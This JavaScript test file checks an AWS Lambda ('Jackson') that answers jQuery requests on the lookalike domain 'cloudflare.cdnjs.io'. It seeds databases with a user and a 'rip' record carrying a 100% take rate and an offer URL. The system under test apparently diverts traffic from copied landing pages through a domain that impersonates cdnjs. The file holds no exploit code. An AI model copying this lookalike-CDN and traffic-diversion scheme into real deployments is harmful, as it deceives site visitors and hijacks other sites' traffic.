import moment from 'moment';
import {
    expect,
} from 'chai';

import MongoDao from '../../../../../../../lib/jackson-core/lib/dao/mongo-dao';
import RedisDao from '../../../../../../../lib/jackson-core/lib/dao/redis-dao';
import Config from '../../../../../../../lib/jackson-core/config';

import lambda from '../../../../../../../src';

describe('Jackson Lambda', () => {
  describe('Expected to', () => {
    describe('the domain cloudflare.cdnjs.io will', () => {
      const validEvent = {
        resource: '/{proxy+}',
        path: '/ajax/libs/jquery/9.9.9/jquery.min.js',
        httpMethod: 'GET',
        headers: {
          Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
          'Accept-Encoding': 'gzip, deflate, sdch, br',
          'Accept-Language': 'en-US,en;q=0.8,nb;q=0.6',
          'cache-control': 'no-cache',
          'CloudFront-Forwarded-Proto': 'https',
          'CloudFront-Is-Desktop-Viewer': 'true',
          'CloudFront-Is-Mobile-Viewer': 'false',
          'CloudFront-Is-SmartTV-Viewer': 'false',
          'CloudFront-Is-Tablet-Viewer': 'false',
          'CloudFront-Viewer-Country': 'US',
          Host: 'test.cdnjs.io',
          pragma: 'no-cache',
          Referer: 'https://some-lander.com/landingpage.html',
          'upgrade-insecure-requests': '1',
          'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
          Via: '2.0 0826158c5b3316bf0a83b23783f3dc7a.cloudfront.net (CloudFront)',
          'X-Amz-Cf-Id': '2By-byGOzJlcp7_QG2P-NcOzso0mkuYZAHXolfv_INfX6jmSiQN7qg==',
          'X-Amzn-Trace-Id': 'Root=1-592de61d-3e228ebe169c0af04c99dfd8',
          'X-Forwarded-For': '2602:304:ce3e:27f0:1e:abc8:9568:8b1, 205.251.202.64',
          'X-Forwarded-Port': '443',
          'X-Forwarded-Proto': 'https',
        },
        queryStringParameters: null,
        pathParameters: {
          proxy: 'ajax/libs/jquery/9.9.9/core.js',
        },
        stageVariables: {
          redirectHost: 'cdnjs.cloudflare.com',
          alias: 'test',
        },
        requestContext: {
          path: '/ajax/libs/jquery/9.9.9/core.js',
          accountId: '834835117621',
          resourceId: '265ues',
          stage: 'test',
          requestId: '30fe6bca-4580-11e7-8ec6-dd72a78e05bf',
          identity: {
            cognitoIdentityPoolId: null,
            accountId: null,
            cognitoIdentityId: null,
            caller: null,
            apiKey: '',
            sourceIp: '2602:304:ce3e:27f0:1e:abc8:9568:8b1',
            accessKey: null,
            cognitoAuthenticationType: null,
            cognitoAuthenticationProvider: null,
            userArn: null,
            userAgent: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
            user: null,
          },
          resourcePath: '/{proxy+}',
          httpMethod: 'GET',
          apiId: 'amghtfwws9',
        },
        body: null,
        isBase64Encoded: false,
      };

      const testUser = {
        _id: '7840a8e8b5cabc3836c14593',
        name: 'Test User',
        email: 'testuser@gmail.com',
        created_on: new Date(),
        last_updated: new Date(),
        uuids: [
          // Matches test path in our mapRequestToCoreInputs test.
          { uuid: '9.9.9' },
        ],
        config: {
          last_updated: new Date(),
          min_minutes_consecutive_traffic: 0,
          min_daily_hits_to_take: 0,
          min_hits_per_min_to_take: 0,
        },
      };

      // This rip needs to match the userConfig for testUser so that it will always rip
      const hour = moment().format('H');
      const geo = { country: 'US' };
      const rip = {
        url: 'some-lander.com/landingpage.html',
        take_rate: 1,
        offer: {
          _id: 'offer-id',
          url: 'http://testurl.com',
        },
        hits_per_min: 15,
        consecutive_min_traffic: 5,
        archive: {
          hourly: [
            {
              hour,
              hits: [
                { cc: geo.country, hits: 100 },
              ],
            },
          ],
        },
      };

      before((done) => {
        // Before each test we need to create all necessary conditions for a jack.
        // This means addig the user with correct configuration, creating the rip
        // so a new one isn't created (which would forward us), and any other information
        // we need. URL should have a take_rate of 100%, and config should have thresholds
        // set to instant jack.

        const redisDao = new RedisDao({
          config: new Config({ stageVariables: validEvent.stageVariables }).redisDaoConfig(),
        });
        const mongoDao = new MongoDao({
          config: new Config({ stageVariables: validEvent.stageVariables }).mongoDaoConfig(),
        });

        // Remove rip from mongo
        mongoDao.removeRip(rip.url)
          // remove rip from redis
          .then(() => redisDao.delKey(rip.url))
          // delete config from redis for testUser
          .then(() => redisDao.delKey(testUser._id))
          // create user in mongo
          .then(() => mongoDao.removeUser(testUser))
          .then(() => mongoDao.createUser(testUser))
          // create rip in mongo
          .then(() => mongoDao.createRip(rip, geo))
          .then(() => redisDao.closeConnection())
          .then(() => mongoDao.closeConnection())
          .then(() => {
            done();
          });
      });

      after((done) => {
        // After test, we need to completely reset the system. This means
        // we need to remove the tested items from the cache, and mongo.

        const redisDao = new RedisDao({
          config: new Config({ stageVariables: validEvent.stageVariables }).redisDaoConfig(),
        });
        const mongoDao = new MongoDao({
          config: new Config({ stageVariables: validEvent.stageVariables }).mongoDaoConfig(),
        });

        // delete rip from redis
        redisDao.delKey(rip.url)
          // delete the rip from mongo
          .then(() => mongoDao.removeRip(rip.url))
          // delete config from redis for testUser
          .then(() => redisDao.delKey(testUser._id))
          // remove user from mongo
          .then(() => mongoDao.removeUser(testUser))
          // delete whitelistedDomains from redis
          .then(() => redisDao.delWhitelistedDomains())
          .then(() => redisDao.closeConnection())
          .then(() => mongoDao.closeConnection())
          .then(() => {
            done();
          });
      });

      it.only('Respond to GET request from http://cloudflare.cdnjs.io/ajax/libs/jquery/9.9.9/jquery.min.js', (done) => {
        lambda.handler(validEvent, {}, (err, response) => {
          try {
            expect(err).to.equal(null);
            const {
            headers = {},
          } = response;
            expect(headers.Location).to
            .equal(undefined);
            done();
          } catch (e) {
            done(e);
          }
        });
      });
    });
  });
});


// Example Input
// {
//   resource: '/{proxy+}',
//   path: '/favicon.ico',
//   httpMethod: 'GET',
//   headers: {
//     Accept: 'image/webp,image/*,*/*;q=0.8',
//     'Accept-Encoding': 'gzip, deflate, sdch, br',
//     'Accept-Language': 'en-US,en;q=0.8,nb;q=0.6',
//     'cache-control': 'no-cache',
//     'CloudFront-Forwarded-Proto': 'https',
//     'CloudFront-Is-Desktop-Viewer': 'true',
//     'CloudFront-Is-Mobile-Viewer': 'false',
//     'CloudFront-Is-SmartTV-Viewer': 'false',
//     'CloudFront-Is-Tablet-Viewer': 'false',
//     'CloudFront-Viewer-Country': 'US',
//     Host: 'cloudflare.cdnjs.io',
//     pragma: 'no-cache',
//     Referer: 'https://test.cdnjs.io/jquery/dist',
//     'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5)
//      AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
//     Via: '2.0 ee9d39c7785a9185384280d8c69fefec.cloudfront.net (CloudFront)',
//     'X-Amz-Cf-Id': 'T7u92NMClHSTAo57gkD_TqhPgo7Sa3LrhhWCNlkKlyn5SPPCVkuEFA==',
//     'X-Amzn-Trace-Id': 'Root=1-592ce320-60774ca065fe69b175362eee',
//     'X-Forwarded-For': '2602:304:ce3e:27f0:1e:abc8:9568:8b1, 205.251.214.90',
//     'X-Forwarded-Port': '443',
//     'X-Forwarded-Proto': 'https',
//   },
//   queryStringParameters: null,
//   pathParameters: {
//     proxy: 'favicon.ico',
//   },
//   stageVariables: {
//     redirectHost: 'cdnjs.cloudflare.com',
//     alias: 'test',
//   },
//   requestContext: {
//     path: '/favicon.ico',
//     accountId: '834835117621',
//     resourceId: '265ues',
//     stage: 'test',
//     requestId: 'd21c5110-44e5-11e7-bfdc-5fcdc2e1bed7',
//     identity: {
//       cognitoIdentityPoolId: null,
//       accountId: null,
//       cognitoIdentityId: null,
//       caller: null,
//       apiKey: '',
//       sourceIp: '2602:304:ce3e:27f0:1e:abc8:9568:8b1',
//       accessKey: null,
//       cognitoAuthenticationType: null,
//       cognitoAuthenticationProvider: null,
//       userArn: null,
//       userAgent: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36
//        (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
//       user: null,
//     },
//     resourcePath: '/{proxy+}',
//     httpMethod: 'GET',
//     apiId: 'amghtfwws9',
//   },
//   body: null,
//   isBase64Encoded: false,
// }
